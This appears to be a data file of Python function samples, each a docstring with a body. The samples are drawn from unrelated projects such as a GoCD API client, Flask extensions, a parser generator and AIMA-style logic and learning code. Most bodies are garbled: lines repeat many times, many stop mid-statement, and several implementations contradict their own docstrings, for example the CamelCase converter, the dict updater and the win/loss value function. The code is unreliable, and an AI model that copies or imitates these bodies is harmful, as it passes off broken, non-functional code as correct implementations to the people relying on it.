        "def _infer_gender(self, p_gender):\n        \"\"\"\n        This model recognizes that sex chromosomes don't always line up with\n        gender. Assign M, F, or NB according to the probabilities in p_gender.\n        \"\"\"\n        if self.gender_probabilities is None:\n            return\n        if self.gender_probabilities.shape[0] == 0:\n            return\n        if self.gender_probabilities.shape[1] == 0:\n            return\n        if self.gender_probabilities.shape[0] == 1:\n            return\n        if self.gender_probabilities.shape[1] == 1:\n            return\n        if self.gender_probabilities.shape[0] == 2:\n            return\n        if self.gender_probabilities.shape[1] == 2:\n            return\n        if self.gender_prob",
        "def _validate_input(self, input_):\n        \"\"\"Accept either strings or Gods as inputs.\"\"\"\n        if isinstance(input_, God):\n            input_ = input_.gods\n        if isinstance(input_, str):\n            input_ = [input_]\n        return input_",
        "def _combine_gametes(self, egg, sperm):\n        \"\"\"\n        Produce two gametes, an egg and a sperm, from the input strings.\n        Combine them to produce a genome a la sexual reproduction.\n        \"\"\"\n        egg = egg.split('\\n')\n        sperm = sperm.split('\\n')\n        egg = [x.strip() for x in egg]\n        sperm = [x.strip() for x in sperm]\n        egg = [x for x in egg if x]\n        sperm = [x for x in sperm if x]\n        egg = [x for x in egg if x]\n        sperm = [x for x in sperm if x]\n        egg = [x for x in egg if x]\n        sperm = [x for x in sperm if x]\n        return",
        "def _combine_gametes(self, Gods, p_divinity, p_egg, p_sperm):\n        \"\"\"\n        Produce two gametes, an egg and a sperm, from input Gods. Combine\n        them to produce a genome a la sexual reproduction. Assign divinity\n        according to probabilities in p_divinity. The more divine the parents,\n        the more divine their offspring.\n        \"\"\"\n        # Create a list of the parents\n        parents = []\n        for God in Gods:\n            parents.append(God.parent)\n        # Create a list of the offspring\n        offspring = []\n        for God in Gods:\n            offspring.append(God.offspring)\n        # Create a list of the divinities\n        divinities = []\n",
        "def _extract_23_chromosomes(self, egg_or_sperm_word):\n        \"\"\"Extract 23 'chromosomes' aka words from 'gene pool' aka list of tokens\n        by searching the list of tokens for words that are related to the given\n        egg_or_sperm_word.\n        \"\"\"\n        egg_or_sperm_word = egg_or_sperm_word.lower()\n        egg_or_sperm_word = egg_or_sperm_word.replace(\" \", \"\")\n        egg_or_sperm_word = egg_or_sperm_word.replace(\"-\", \"\")\n        egg_or_sperm_word = egg_or_sperm_word.replace(\".\", \"\")\n        egg_or_sperm_word = egg_or_sperm_word.replace(\".\", \"\")\n",
        "def print_parents(self):\n        \"\"\"Print parents' names and epithets.\"\"\"\n        print('Parents:')\n        for parent in self.parents:\n            print('  %s' % parent)\n        print('')",
        "def stage(self, counter=False, pipeline_counter=False):\n        \"\"\"Returns all the information regarding a specific stage run\n\n        See the `Go stage instance documentation`__ for examples.\n\n        .. __: http://api.go.cd/current/#get-stage-instance\n\n        Args:\n          counter (int): The stage instance to fetch.\n            If falsey returns the latest stage instance from :meth:`history`.\n          pipeline_counter (int): The pipeline instance for which to fetch\n            the stage. If falsey returns the latest pipeline instance.\n\n        Returns:\n          Response: :class:`gocd.api.response.Response` object\n        \"\"\"\n        if counter:\n            return self.history(pipeline_counter=pipeline_counter)\n        else:\n            return self.pipeline(pipeline_counter=pipeline_counter)",
        "def request(self, path, data=None, headers=None):\n        \"\"\"Performs a HTTP request to the Go server\n\n        Args:\n          path (str): The full path on the Go server to request.\n            This includes any query string attributes.\n          data (str, dict, bool, optional): If any data is present this\n            request will become a POST request.\n          headers (dict, optional): Headers to set for this particular\n            request\n\n        Raises:\n          HTTPError: when the HTTP request fails.\n\n        Returns:\n          file like object: The response from a\n            :func:`urllib2.urlopen` call\n        \"\"\"\n        if data is None:\n            data = {}\n        if headers is None:\n            headers = {}\n        if self.auth_token:\n            headers['Authorization'] = 'Bearer %s' % self.auth_token\n",
        "def _make_request(self, response):\n        \"\"\"Make the request appear to be coming from a browser\n\n        This is to interact with older parts of Go that doesn't have a\n        proper API call to be made. What will be done:\n\n        1. If no response passed in a call to `go/api/pipelines.xml` is\n           made to get a valid session\n        2. `JSESSIONID` will be populated from this request\n        3. A request to `go/pipelines` will be so the\n           `authenticity_token` (CSRF) can be extracted. It will then\n           silently be injected into `post_args` on any POST calls that\n           doesn't start with `go/api` from this point.\n\n        Args:\n          response: a :class:`Response` object from a previously successful\n            API call. So we won't",
        "def flatten(d):\n    \"\"\"Return a dict as a list of lists.\n\n    >>> flatten({\"a\": \"b\"})\n    [['a', 'b']]\n    >>> flatten({\"a\": [1, 2, 3]})\n    [['a', [1, 2, 3]]]\n    >>> flatten({\"a\": {\"b\": \"c\"}})\n    [['a', 'b', 'c']]\n    >>> flatten({\"a\": {\"b\": {\"c\": \"e\"}}})\n    [['a', 'b', 'c', 'e']]\n    >>> flatten({\"a\": {\"b\": \"c\", \"d\": \"e\"}})\n    [['a', 'b', 'c'], ['a', 'd', 'e']]\n    >>> flatten({\"a\": {\"b\": \"c\", \"d\": \"e\"",
        "def get(self, counter=False):\n        \"\"\"\n        Returns all the information regarding a specific pipeline run\n\n        See the `Go pipeline instance documentation`__ for examples.\n\n        .. __: http://api.go.cd/current/#get-pipeline-instance\n\n        Args:\n          counter (int): The pipeline instance to fetch.\n            If falsey returns the latest pipeline instance from :meth:`history`.\n\n        Returns:\n          Response: :class:`gocd.api.response.Response` object\n        \"\"\"\n        if counter:\n            return self.history(counter=counter)\n        return self.pipeline(counter=counter)",
        "def schedule(self, variables=None, secure_variables=None, materials=None,\n                 return_new_instance=False, backoff_time=0.1):\n        \"\"\"Schedule a pipeline run\n\n        Aliased as :meth:`run`, :meth:`schedule`, and :meth:`trigger`.\n\n        Args:\n          variables (dict, optional): Variables to set/override\n          secure_variables (dict, optional): Secure variables to set/override\n          materials (dict, optional): Material revisions to be used for\n            this pipeline run. The exact format for this is a bit iffy,\n            have a look at the official\n            `Go pipeline scheduling documentation`__ or inspect a call\n            from triggering manually in the UI.\n          return_new_instance (bool): Returns a :meth:`history` compatible\n            response for the newly scheduled instance. This is primarily so\n            users easily",
        "def output(self, instance=None):\n        \"\"\"Yields the output and metadata from all jobs in the pipeline\n\n        Args:\n          instance: The result of a :meth:`instance` call, if not supplied\n            the latest of the pipeline will be used.\n\n        Yields:\n          tuple: (metadata (dict), output (str)).\n\n          metadata contains:\n            - pipeline\n            - pipeline_counter\n            - stage\n            - stage_counter\n            - job\n            - job_result\n        \"\"\"\n        if not instance:\n            instance = self.instance()\n        for job in self.jobs:\n            job_result = job.result()\n            output = job_result.output()\n            yield job_result.metadata(), output",
        "def update_template_config(self, template_name, **kwargs):\n        \"\"\"Update template config for specified template name.\n\n        .. __: https://api.go.cd/current/#edit-template-config\n\n        Returns:\n          Response: :class:`gocd.api.response.Response` object\n        \"\"\"\n        return self.put(self.template_config_path % (template_name), **kwargs)",
        "def create(self, name, **kwargs):\n        \"\"\"Create template config for specified template name.\n\n        .. __: https://api.go.cd/current/#create-template-config\n\n        Returns:\n          Response: :class:`gocd.api.response.Response` object\n        \"\"\"\n        return self.api_call(\n            'post',\n            self.template_config_path % (name),\n            data=kwargs\n        )",
        "def delete_template(self, template_name):\n        \"\"\"Delete template config for specified template name.\n\n        .. __: https://api.go.cd/current/#delete-a-template\n\n        Returns:\n          Response: :class:`gocd.api.response.Response` object\n        \"\"\"\n        return self.api_call(\n            'template',\n            'delete',\n            params={'template_name': template_name},\n        )",
        "def get_pipelines(self):\n        \"\"\"Returns a set of all pipelines from the last response\n\n        Returns:\n          set: Response success: all the pipelines available in the response\n               Response failure: an empty set\n        \"\"\"\n        if self.response.status_code == 200:\n            return set(self.response.json())\n        else:\n            return set()",
        "def get_directory(self, path_to_directory, timeout=None, backoff=None,\n                       max_wait=None):\n        \"\"\"Gets an artifact directory by its path.\n\n        See the `Go artifact directory documentation`__ for example responses.\n\n        .. __: http://api.go.cd/current/#get-artifact-directory\n\n        .. note::\n          Getting a directory relies on Go creating a zip file of the\n          directory in question. Because of this Go will zip the file in\n          the background and return a 202 Accepted response. It's then up\n          to the client to check again later and get the final file.\n\n          To work with normal assumptions this :meth:`get_directory` will\n          retry itself up to ``timeout`` seconds to get a 200 response to\n          return. At that point it will then return the response as is, no\n          matter",
        "def load_config(app, instance_folder):\n    \"\"\"Configuration loader.\n\n    Adds support for loading templates from the Flask application's instance\n    folder (``<instance_folder>/templates``).\n    \"\"\"\n    app.config.setdefault('TEMPLATES_DIR', instance_folder + '/templates')\n    app.config.setdefault('TEMPLATES_EXT', '.html')\n    app.config.setdefault('TEMPLATES_EXT_PATH', instance_folder + '/templates')\n    app.config.setdefault('TEMPLATES_EXT_PREFIX', 'templates')\n    app.config.setdefault('TEMPLATES_EXT_SUFFIX', '.html')\n    app.config.setdefault('TEMPLATES_EXT_PREFIX_PATH', instance_folder + '/templates')\n    app.config.setdefault('TEMPLATES_EXT_SUFFIX_PATH', instance_folder + '/templates')\n   ",
        "def create_app(app):\n    \"\"\"Create Flask application class.\n\n    Invenio-Files-REST needs to patch the Werkzeug form parsing in order to\n    support streaming large file uploads. This is done by subclassing the Flask\n    application class.\n    \"\"\"\n    from . import views\n    from . import models\n\n    app.config.setdefault('FILES_UPLOAD_MAX_SIZE', 1024 * 1024 * 10)\n    app.config.setdefault('FILES_UPLOAD_MAX_AGE', 3600 * 24 * 365)\n\n    app.config.setdefault('FILES_UPLOAD_MAX_UPLOAD_SIZE', 1024 * 1024)\n    app.config.setdefault('FILES_UPLOAD_MAX_UPLOAD_AGE', 3600 * 24 * 365)\n\n    app.config.setdefault('FILES_UPLOAD_MAX_UPLOAD_SIZE_LIMIT', 1024 * 1024)\n   ",
        "def init_app(self, app):\n        \"\"\"Initialize application object.\n\n        :param app: An instance of :class:`~flask.Flask`.\n        \"\"\"\n        self.app = app\n        self.app.config.setdefault('FLASK_DEBUG', False)\n        self.app.config.setdefault('FLASK_DEBUG_LEVEL', 0)\n        self.app.config.setdefault('FLASK_DEBUG_LEVEL_ALL', 0)\n        self.app.config.setdefault('FLASK_DEBUG_LEVEL_ALL', 0)\n        self.app.config.setdefault('FLASK_DEBUG_LEVEL_ALL', 0)\n        self.app.config.setdefault('FLASK_DEBUG_LEVEL_ALL', 0)\n        self.app.config.setdefault('FLASK_DEBUG_LEVEL_ALL",
        "def init_app(self, app):\n        \"\"\"Initialize configuration.\n\n        :param app: An instance of :class:`~flask.Flask`.\n        \"\"\"\n        self.app = app\n        self.app.config.setdefault('FLASK_DEBUG', False)\n        self.app.config.setdefault('FLASK_DEBUG_LEVEL', 0)\n        self.app.config.setdefault('FLASK_DEBUG_LEVEL_ALL', 0)\n        self.app.config.setdefault('FLASK_DEBUG_LEVEL_ALL', 0)\n        self.app.config.setdefault('FLASK_DEBUG_LEVEL_ALL', 0)\n        self.app.config.setdefault('FLASK_DEBUG_LEVEL_ALL', 0)\n        self.app.config.setdefault('FLASK_DEBUG_LEVEL_ALL',",
        "def camel2word(name):\n    \"\"\"Covert name from CamelCase to \"Normal case\".\n\n    >>> camel2word('CamelCase')\n    'Camel case'\n    >>> camel2word('CaseWithSpec')\n    'Case with spec'\n    \"\"\"\n    words = re.split(r'([A-Z])', name)\n    return words[0].lower() + words[1:]",
        "def format_time(time):\n    \"\"\"Format a time in seconds.\"\"\"\n    if time is None:\n        return None\n    if isinstance(time, datetime):\n        return time.strftime('%Y-%m-%dT%H:%M:%S.%f')\n    return time",
        "def indent_dict(d, indent=0):\n    \"\"\"Indent representation of a dict\"\"\"\n    return '\\n'.join(indent_line(v, indent) for k, v in d.items())",
        "def regex_in_haystack(haystack, needle, escape=True):\n    \"\"\"Test for existence of ``needle`` regex within ``haystack``.\n\n    Say ``escape`` to escape the ``needle`` if you aren't really using the\n    regex feature & have special characters in it.\n    \"\"\"\n    if needle is None:\n        return False\n    if needle.startswith('^'):\n        needle = needle[1:]\n    if needle.endswith('$'):\n        needle = needle[:-1]\n    if needle in haystack:\n        return True\n    if escape:\n        return False",
        "def setup_class_link(obj):\n    \"\"\"Mutates any attributes on ``obj`` which are classes, with link to ``obj``.\n\n    Adds a convenience accessor which instantiates ``obj`` and then calls its\n    ``setup`` method.\n\n    Recurses on those objects as well.\n    \"\"\"\n    for attr in dir(obj):\n        if attr.startswith('_'):\n            continue\n        if not attr.startswith('_'):\n            setattr(obj, attr, getattr(obj, attr))\n    setup(obj)",
        "def procesa_tcu_cp_feu(df, verbose=False, convert_kwh=True):\n    \"\"\"Procesa TCU, CP, FEU diario.\n\n    :param df:\n    :param verbose:\n    :param convert_kwh:\n    :return:\n    \"\"\"\n    if verbose:\n        print(\"Procesando TCU, CP, FEU...\")\n\n    # TCU\n    tcu = df.loc[:, \"TCU\"]\n    if verbose:\n        print(\"TCU: \", tcu)\n\n    # CP\n    cp = df.loc[:, \"CP\"]\n    if verbose:\n        print(\"CP: \", cp)\n\n    # FEU\n    feu = df.loc[:, \"FEU\"]\n    if verbose:\n        print(\"FEU: \", feu)\n\n",
        "def compress(self, msg):\n        \"\"\"Compress the log message in order to send less bytes to the wire.\"\"\"\n        if self.compressor is None:\n            return msg\n        return self.compressor.compress(msg)",
        "def _handle_nested_classes(self, node):\n        \"\"\"Internal bookkeeping to handle nested classes\"\"\"\n        if node.name in self.classes:\n            raise ValueError(\"Class %s already exists\" % node.name)\n        self.classes[node.name] = node",
        "def registerGoodClass(self, goodClass):\n        \"\"\"\n        Needs to be its own method so it can be called from both wantClass and\n        registerGoodClass.\n        \"\"\"\n        if goodClass.name in self.goodClasses:\n            raise ValueError(\"Class %s already registered\" % goodClass.name)\n        self.goodClasses[goodClass.name] = goodClass",
        "def _resample_data(self, data, resampling_method, resampling_method_params):\n        \"\"\"Obtiene los dataframes de los datos de PVPC con resampling diario y mensual.\"\"\"\n        if resampling_method == 'diario':\n            return self._resample_diario(data, resampling_method_params)\n        elif resampling_method == 'mensual':\n            return self._resample_mensual(data, resampling_method_params)\n        else:\n            raise ValueError('Resampling method {} is not supported.'.format(resampling_method))",
        "def sanitize_path(path):\n    \"\"\"Performs sanitation of the path after validating\n\n    :param path: path to sanitize\n    :return: path\n    :raises:\n        - InvalidPath if the path doesn't start with a slash\n    \"\"\"\n    if not path.startswith('/'):\n        raise InvalidPath('Path must start with a slash')\n    return path",
        "def validate(obj):\n    \"\"\"Ensures the passed schema instance is compatible\n\n    :param obj: object to validate\n    :return: obj\n    :raises:\n        - IncompatibleSchema if the passed schema is of an incompatible type\n    \"\"\"\n    if not isinstance(obj, Schema):\n        raise IncompatibleSchema(\n            \"Schema instance must be of type Schema\"\n        )\n    return obj",
        "def journey_route(bp, *args, **kwargs):\n    \"\"\"Journey route decorator\n\n    Enables simple serialization, deserialization and validation of Flask routes with the help of Marshmallow.\n\n    :param bp: :class:`flask.Blueprint` object\n    :param args: args to pass along to `Blueprint.route`\n    :param kwargs:\n        - :strict_slashes: Enable / disable strict slashes (default False)\n        - :validate: Enable / disable body/query validation (default True)\n        - :_query: Unmarshal Query string into this schema\n        - :_body: Unmarshal JSON body into this schema\n        - :marshal_with: Serialize the output with this schema\n    :raises:\n        - ValidationError if the query parameters or JSON body fails validation\n    \"\"\"\n    validate = kwargs.pop('validate', True)\n    _query = kwargs",
        "def add_blueprint(self, bp, description=None):\n        \"\"\"Attaches a flask.Blueprint to the bundle\n\n        :param bp: :class:`flask.Blueprint` object\n        :param description: Optional description string\n        :raises:\n            - InvalidBlueprint if the Blueprint is not of type `flask.Blueprint`\n        \"\"\"\n        if not isinstance(bp, Blueprint):\n            raise InvalidBlueprint(\n                \"Blueprint must be of type flask.Blueprint\")\n        self.blueprints.append(bp)\n        if description:\n            self.blueprint_descriptions[bp.name] = description",
        "def move_dot(self, dot_index):\n        \"\"\"Returns the DottedRule that results from moving the dot.\"\"\"\n        if dot_index < 0 or dot_index >= self.dot_count:\n            raise ValueError(\"Dot index out of range\")\n        return DottedRule(self.dot_rules[dot_index], self.dot_rules[dot_index + 1])",
        "def _compute_intermediate_first(self, symbols):\n        \"\"\"Computes the intermediate FIRST set using symbols.\"\"\"\n        first_set = set()\n        for symbol in symbols:\n            if symbol in self.intermediate_first:\n                first_set.add(symbol)\n        return first_set",
        "def _compute_first_all(self):\n        \"\"\"Computes the FIRST set for every symbol in the grammar.\n\n        Tenatively based on _compute_first in PLY.\n        \"\"\"\n        first = set()\n        for symbol in self.symbols:\n            first.update(self._compute_first(symbol))\n        return first",
        "def _compute_follow_nonterminal(self, grammar):\n        \"\"\"Computes the FOLLOW set for every non-terminal in the grammar.\n\n        Tenatively based on _compute_follow in PLY.\n        \"\"\"\n        follow = set()\n        for n in grammar.nonterminals:\n            if n.is_terminal:\n                follow.add(n.name)\n        return follow",
        "def _initial_closure(self, start_foo):\n    \"\"\"Computes the initial closure using the START_foo production.\"\"\"\n    closure = self._start_closure(start_foo)\n    if closure is not None:\n      return closure\n\n    closure = self._start_closure(self._start_foo)\n    if closure is not None:\n      return closure\n\n    closure = self._start_closure(self._start_foo)\n    if closure is not None:\n      return closure\n\n    closure = self._start_closure(self._start_foo)\n    if closure is not None:\n      return closure\n\n    closure = self._start_closure(self._start_foo)\n    if closure is not None:\n      return closure\n\n    closure = self._start_closure(self._start_foo)\n    if closure is not None:\n      return closure\n",
        "def _compute_closure(self, rules, symbol):\n        \"\"\"Computes the next closure for rules based on the symbol we got.\n\n        Args:\n            rules - an iterable of DottedRules\n            symbol - a string denoting the symbol we've just seen\n\n        Returns: frozenset of DottedRules\n        \"\"\"\n        closure = frozenset()\n        for rule in rules:\n            if rule.symbol == symbol:\n                closure.update(rule.closure)\n        return closure",
        "def _fill_closure(self, rules):\n        \"\"\"Fills out the entire closure based on some initial dotted rules.\n\n        Args:\n            rules - an iterable of DottedRules\n\n        Returns: frozenset of DottedRules\n        \"\"\"\n        closure = frozenset(rules)\n        for rule in rules:\n            if rule.is_root:\n                continue\n            if rule.is_leaf:\n                closure.add(rule)\n            else:\n                for child in rule.children:\n                    closure.add(child)\n        return closure",
        "def init_app(self, app):\n        \"\"\"Initializes Journey extension\n\n        :param app: App passed from constructor or directly to init_app\n        :raises:\n            - NoBundlesAttached if no bundles has been attached attached\n        \"\"\"\n        if not self.bundles:\n            raise NoBundlesAttached()\n\n        for bundle in self.bundles:\n            bundle.init_app(app)",
        "def get_blueprint_info(self):\n        \"\"\"\n        Returns simple info about registered blueprints\n\n        :return: Tuple containing endpoint, path and allowed methods for each route\n        \"\"\"\n        info = {}\n        for endpoint in self.blueprints:\n            info[endpoint] = self.blueprints[endpoint].get_blueprint_info()\n        return info",
        "def exists(self, path):\n        \"\"\"\n        Checks if a bundle exists at the provided path\n\n        :param path: Bundle path\n        :return: bool\n        \"\"\"\n        return self.client.exists(self.bundle_path(path))",
        "def attach_bundle(self, bundle):\n        \"\"\"Attaches a bundle object\n\n        :param bundle: :class:`flask_journey.BlueprintBundle` object\n        :raises:\n            - IncompatibleBundle if the bundle is not of type `BlueprintBundle`\n            - ConflictingPath if a bundle already exists at bundle.path\n            - MissingBlueprints if the bundle doesn't contain any blueprints\n        \"\"\"\n        if not isinstance(bundle, BlueprintBundle):\n            raise IncompatibleBundle(\n                \"The bundle must be of type BlueprintBundle\")\n        if bundle.path not in self.bundles:\n            raise ConflictingPath(\n                \"The bundle already exists at {}\".format(bundle.path))\n        if bundle.blueprints:\n            raise MissingBlueprints(\n                \"The bundle doesn't contain any blueprints\")\n        self.bundles[bundle.path] = bundle",
        "def register_blueprint(self, bp, bundle_path, child_path):\n        \"\"\"\n        Register and return info about the registered blueprint\n\n        :param bp: :class:`flask.Blueprint` object\n        :param bundle_path: the URL prefix of the bundle\n        :param child_path: blueprint relative to the bundle path\n        :return: Dict with info about the blueprint\n        \"\"\"\n        self.blueprints[child_path] = bp\n        self.bundle_path = bundle_path\n        return bp",
        "def get_blueprint_route_info(self, app, base_path):\n        \"\"\"\n        Returns detailed information about registered blueprint routes matching the `BlueprintBundle` path\n\n        :param app: App instance to obtain rules from\n        :param base_path: Base path to return detailed route info for\n        :return: List of route detail dicts\n        \"\"\"\n        routes = []\n        for route in app.blueprints:\n            if route.name == self.blueprint_name:\n                routes.append(route.as_dict())\n        return routes",
        "def precedence(self):\n        \"\"\"Computes the precedence of terminal and production.\n\n        The precedence of a terminal is it's level in the PRECEDENCE tuple. For\n        a production, the precedence is the right-most terminal (if it exists).\n        The default precedence is DEFAULT_PREC - (LEFT, 0).\n\n        Returns:\n            precedence - dict[terminal | production] = (assoc, level)\n        \"\"\"\n        precedence = DEFAULT_PREC\n        for term in self.terms:\n            precedence = precedence.setdefault(term, DEFAULT_PREC)\n        return precedence",
        "def generate_tables(self):\n        \"\"\"Generates the ACTION and GOTO tables for the grammar.\n\n        Returns:\n            action - dict[state][lookahead] = (action, ...)\n            goto - dict[state][just_reduced] = new_state\n        \"\"\"\n        action = {}\n        goto = {}\n        for state in self.states:\n            lookahead = self.lookaheads[state]\n            if lookahead is None:\n                continue\n            action[state] = lookahead\n            goto[state] = state\n        return action, goto",
        "def _get_definite_clause_antecedents_and_consequent(\n        clause: Clause,\n) -> Tuple[List[Clause], List[Clause]]:\n    \"\"\"Return the antecedents and the consequent of a definite clause.\"\"\"\n    antecedents = clause.get_antecedents()\n    consequent = clause.get_consequent()\n    return antecedents, consequent",
        "def _tt_entails(self, tt_entails):\n        \"\"\"Auxiliary routine to implement tt_entails.\"\"\"\n        if tt_entails is None:\n            return None\n        if isinstance(tt_entails, (list, tuple)):\n            return tt_entails\n        return [tt_entails]",
        "def propositional_symbols(x):\n    \"\"\"Return a list of all propositional symbols in x.\"\"\"\n    return [\n        symbol\n        for symbol in x\n        if not is_propositional(symbol)\n    ]",
        "def is_true(expr):\n    \"\"\"Return True if the propositional logic expression is true in the model,\n    and False if it is false. If the model does not specify the value for\n    every proposition, this may return None to indicate 'not obvious';\n    this may happen even when the expression is tautological.\n    \"\"\"\n    if expr.is_true:\n        return True\n    if expr.is_false:\n        return False\n    if expr.is_none:\n        return None\n    return expr.value",
        "def _is_partial_model(self, model):\n        \"\"\"See if the clauses are true in a partial model.\"\"\"\n        if model is None:\n            return False\n        for clause in self.clauses:\n            if clause.is_partial_model:\n                return True\n        return False",
        "def _variable(self, name):\n        \"\"\"A variable is an Expr with no args and a lowercase symbol as the op.\"\"\"\n        return self._expr(name, self._op_symbol(name), self._op_symbol(name))",
        "def remove_clauses(self, sentence):\n        \"\"\"Remove the sentence's clauses from the KB.\"\"\"\n        for clause in sentence.clauses:\n            self.remove_clause(clause)",
        "def update_cache(self):\n        \"\"\"Updates the cache with setting values from the database.\"\"\"\n        self.cache = self.get_cache()\n        self.cache.update(self.get_cache_values())",
        "def search(game, alpha=0.5, beta=0.5, eval_func=None):\n    \"\"\"\n    Search game to determine best action; use alpha-beta pruning.\n    This version cuts off search and uses an evaluation function.\n    \"\"\"\n    if eval_func is None:\n        eval_func = lambda x: x\n    if alpha < 0:\n        alpha = 0.5\n    if beta < 0:\n        beta = 0.5\n    if alpha > 1:\n        raise ValueError(\"alpha must be greater than 0\")\n    if beta > 1:\n        raise ValueError(\"beta must be greater than 0\")\n    if alpha > 1:\n        return eval_func(game)\n    else:\n        return game",
        "def value(self):\n        \"\"\"Return the value to player; -1 for win, 0 for loss, 0 otherwise.\"\"\"\n        if self.is_win:\n            return 0\n        elif self.is_loss:\n            return -1\n        else:\n            return self.value_in_player",
        "def win(self, x, o):\n        \"\"\"If X wins with this move, return 1; if O return -1; else return 0.\"\"\"\n        if self.opponent.wins(x, o):\n            return 1\n        else:\n            return -1",
        "def is_line_through(self, player):\n        \"\"\"Return true if there is a line through move on board for player.\"\"\"\n        return self.board.is_line_through(player, self.player_move(player))",
        "def update(entries, *args, **kwargs):\n    \"\"\"Update a dict, or an object with slots, according to `entries` dict.\n\n    >>> update({'a': 1}, a=10, b=20)\n    {'a': 10, 'b': 20}\n    >>> update(Struct(a=1), a=10, b=20)\n    Struct(a=10, b=20)\n    \"\"\"\n    if isinstance(entries, dict):\n        return dict(entries.items())\n    elif isinstance(entries, Struct):\n        return entries.update(*args, **kwargs)\n    else:\n        raise TypeError(\"entries must be a dict or a Struct\")",
        "def random_pick(seq, n, replacement=None, proportion=0.5):\n    \"\"\"Pick n samples from seq at random, with replacement, with the\n    probability of each element in proportion to its corresponding\n    weight.\n    \"\"\"\n    if replacement is None:\n        replacement = random.random()\n    return [(x, replacement * proportion) for x in seq]",
        "def weighted_random_sample(seq, weights):\n    \"\"\"Return a random-sample function that picks from seq weighted by weights.\"\"\"\n    return lambda x: np.random.choice(seq, size=weights, p=weights, replace=False)",
        "def _format_args(args, fmt, write):\n    \"\"\"Format args with the first argument as format string, and write.\n    Return the last arg, or format itself if there are no args.\n    \"\"\"\n    if len(args) == 0:\n        return fmt\n    else:\n        return _format_arg(args[0], fmt, write)",
        "def _get_name(self, obj):\n        \"\"\"Try to find some reasonable name for the object.\"\"\"\n        if isinstance(obj, (list, tuple)):\n            return obj[0]\n        elif isinstance(obj, dict):\n            return obj.get('__name__', obj.get('__class__.__name__'))\n        else:\n            return obj",
        "def open_file(self, filename):\n        \"\"\"Open a file based at the AIMA root directory.\"\"\"\n        if filename.startswith(self.root_dir):\n            filename = filename[len(self.root_dir):]\n        return open(filename, 'r')",
        "def count_input_attributes(target, input_attributes):\n    \"\"\"\n    Just count how many times each value of each input attribute\n    occurs, conditional on the target value. Count the different\n    target values too.\n    \"\"\"\n    count = 0\n    for attribute in input_attributes:\n        if attribute in target:\n            count += 1\n    return count",
        "def bits(self):\n        \"\"\"Number of bits to represent the probability distribution in values.\"\"\"\n        if self._bits is None:\n            self._bits = self.n_bits\n        return self._bits",
        "def layered_feed_forward(x,\n                         num_hidden,\n                         num_hidden_layers,\n                         num_hidden_layers_2,\n                         num_hidden_layers_3,\n                         num_hidden_layers_4,\n                         num_hidden_layers_5,\n                         num_hidden_layers_6,\n                         num_hidden_layers_7,\n                         num_hidden_layers_8,\n                         num_hidden_layers_9,\n                         num_hidden_layers_10,\n                         num_hidden_layers_11,\n                         num_hidden_layers_12,\n                         num_hidden_layers_13,\n                         num_hidden_layers_14,\n                         num_hidden_layers_15,\n                         num_hidden_layers_16,\n                         num_hidden_layers_17,\n                         num_hidden_layers_18,\n                         num_",
        "def vote_learning_algorithms(self, learning_algorithms):\n        \"\"\"\n        Given a list of learning algorithms, have them vote.\n        \"\"\"\n        if not learning_algorithms:\n            return 0\n        if not isinstance(learning_algorithms, list):\n            raise ValueError(\"Learning algorithms must be a list\")\n        if not all(isinstance(al, (LearningAlgorithm,)) for al in learning_algorithms):\n            raise ValueError(\"Learning algorithms must be an instance of \"\n                             \"LearningAlgorithm\")\n        return sum(al.vote() for al in learning_algorithms)",
        "def _weighted_vote_predictor(self, vote_weight):\n        \"\"\"Return a predictor that takes a weighted vote.\"\"\"\n        def predictor(vote):\n            \"\"\"Predict a vote.\"\"\"\n            return vote * vote_weight\n        return predictor",
        "def copy_dataset(dataset, proportion=0.9):\n    \"\"\"Copy dataset, replicating each example in proportion to its weight.\"\"\"\n    if not isinstance(dataset, Dataset):\n        raise ValueError(\"dataset must be a Dataset\")\n    if not isinstance(proportion, float):\n        raise ValueError(\"proportion must be a float\")\n    return Dataset(dataset.data, dataset.target, dataset.target_names,\n                   dataset.target_types, dataset.target_shapes,\n                   dataset.target_shapes_dtype,\n                   dataset.target_names_dtype,\n                   dataset.target_types_dtype,\n                   dataset.target_shapes_dtype,\n                   proportion)",
        "def leave_one_out_cross_validation(self):\n        \"\"\"Leave one out cross-validation over the dataset.\"\"\"\n        if self.cross_validation_mode == 'train':\n            self.cross_validation_mode = 'test'\n            self.cross_validation_num_batches = 0\n            self.cross_validation_num_batches_per_epoch = 0\n            self.cross_validation_num_batches_per_epoch_train = 0\n            self.cross_validation_num_batches_per_epoch_test = 0\n            self.cross_validation_num_batches_per_epoch_train_loss = 0\n            self.cross_validation_num_batches_per_epoch_test_loss = 0\n            self.cross_validation_num_batches_per_epoch_train_accuracy = 0\n            self.cross_validation_num_batches_per_",
        "def generate_examples(n, dataset_name, dataset_dir):\n  \"\"\"Generate a DataSet with n examples.\"\"\"\n  dataset = tf.data.Dataset.from_tensors(\n      [tf.train.Example(features=[tf.train.Feature(feature=b'a', value=1)])\n       for _ in range(n)])\n  dataset = dataset.map(lambda x: tf.train.Example(features=[x.feature, x.value]))\n  dataset = dataset.map(lambda x: tf.train.Example(features=[x.feature, x.value]))\n  dataset = dataset.map(lambda x: tf.train.Example(features=[x.feature, x.value]))\n  dataset = dataset.map(lambda x: tf.train.Example(features=[x.feature, x.value]))\n  dataset = dataset.map(lambda x: tf",
        "def _uniform_xor(a, b):\n    \"\"\"\n    2 inputs are chosen uniformly from (0.0 .. 2.0]; output is xor of ints.\n    \"\"\"\n    return a ^ b",
        "def compare_learners(learners, datasets, verbose=False):\n    \"\"\"\n    Compare various learners on various datasets using cross-validation.\n    Print results as a table.\n    \"\"\"\n    if verbose:\n        print(\"Compare various learners on various datasets using cross-validation...\")\n\n    # Create the cross-validation model\n    model = Model(learners, datasets)\n\n    # Run the cross-validation\n    model.fit(X_train, y_train)\n    model.score(X_test, y_test)\n\n    # Print the results\n    print(\"Cross-validation results:\")\n    print(\"------------------\")\n    print(\"Training set:\")\n    print(model.train_set_)\n    print(\"Validation set:\")\n    print(model.val_set_)\n    print(\"Training set accuracy:\")\n    print(",
        "def check_sense(self):\n        \"\"\"Check that my fields make sense.\"\"\"\n        for field in self.fields:\n            if field.name not in self.fields:\n                raise ValueError(\"Field '%s' is not in the model.\" % field.name)\n            if field.type != self.fields[field.name].type:\n                raise ValueError(\"Field '%s' is not of the correct type.\" % field.name)",
        "def add_example(self, example):\n        \"\"\"Add an example to the list of examples, checking it first.\"\"\"\n        if example.id not in self.examples:\n            self.examples.append(example)",
